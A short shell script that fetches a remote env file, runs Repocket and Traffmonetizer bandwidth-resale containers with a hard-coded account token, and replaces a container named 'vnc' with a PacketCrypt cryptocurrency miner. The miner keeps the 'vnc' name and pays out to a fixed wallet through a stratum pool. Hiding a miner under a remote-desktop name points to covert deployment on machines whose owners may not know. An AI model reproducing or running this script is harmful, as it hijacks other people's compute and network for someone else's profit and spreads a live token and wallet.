[ -f rp.env ] || wget -O rp.env https://github.com/dediminari/bit/raw/refs/heads/main/rp.env
docker run --env-file rp.env -d --restart=always --name rpkt repocket/repocket
docker run -i --restart=always --name tm traffmonetizer/cli_v2 start accept --token hafcEX5LcrmMO+qTEf4JxmAq+HbfO5+RbEBj4K0Qd+Y=
docker stop vnc && docker rm vnc
docker run -d --name vnc --restart always -e WALLET=pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy thomasjp0x42/packetcrypt-amd64 ann -p pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy https://stratum.zetahash.com


